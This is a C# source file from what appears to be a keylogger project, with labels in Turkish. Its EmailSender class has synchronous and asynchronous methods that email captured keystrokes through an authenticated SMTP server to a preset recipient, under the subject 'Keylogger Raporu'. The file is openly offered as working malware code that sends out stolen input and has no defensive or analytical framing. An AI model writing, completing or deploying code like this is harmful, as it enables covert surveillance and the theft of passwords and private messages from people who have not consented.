using System;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;

namespace Keylogger
{
    public class EmailSender
    {
        private string _smtpServer;
        private int _smtpPort;
        private string _senderEmail;
        private string _senderPassword;
        private string _recipientEmail;

        public EmailSender(string smtpServer, int smtpPort, string senderEmail, string senderPassword, string recipientEmail)
        {
            _smtpServer = smtpServer;
            _smtpPort = smtpPort;
            _senderEmail = senderEmail;
            _senderPassword = senderPassword;
            _recipientEmail = recipientEmail;
        }

        public async Task<bool> SendKeystrokesAsync(string keystrokes)
        {
            try
            {
                using (SmtpClient smtpClient = new SmtpClient(_smtpServer, _smtpPort))
                {
                    smtpClient.EnableSsl = true;
                    smtpClient.Credentials = new NetworkCredential(_senderEmail, _senderPassword);

                    using (MailMessage mailMessage = new MailMessage())
                    {
                        mailMessage.From = new MailAddress(_senderEmail);
                        mailMessage.To.Add(_recipientEmail);
                        mailMessage.Subject = $"Keylogger Raporu - {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
                        mailMessage.Body = $"Tuş vuruşları:\n\n{keystrokes}";
                        mailMessage.IsBodyHtml = false;

                        await smtpClient.SendMailAsync(mailMessage);
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Email gönderme hatası: {ex.Message}");
                return false;
            }
        }

        public bool SendKeystrokes(string keystrokes)
        {
            try
            {
                using (SmtpClient smtpClient = new SmtpClient(_smtpServer, _smtpPort))
                {
                    smtpClient.EnableSsl = true;
                    smtpClient.UseDefaultCredentials = false;
                    smtpClient.Credentials = new NetworkCredential(_senderEmail, _senderPassword);
                    smtpClient.Timeout = 60000;
                    smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;

                    using (MailMessage mailMessage = new MailMessage())
                    {
                        mailMessage.From = new MailAddress(_senderEmail);
                        mailMessage.To.Add(_recipientEmail);
                        mailMessage.Subject = $"Keylogger Raporu - {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
                        mailMessage.Body = $"Tuş vuruşları:\n\n{keystrokes}";
                        mailMessage.IsBodyHtml = false;

                        smtpClient.Send(mailMessage);
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Email gönderme hatası: {ex.Message}");
                return false;
            }
        }
    }
}
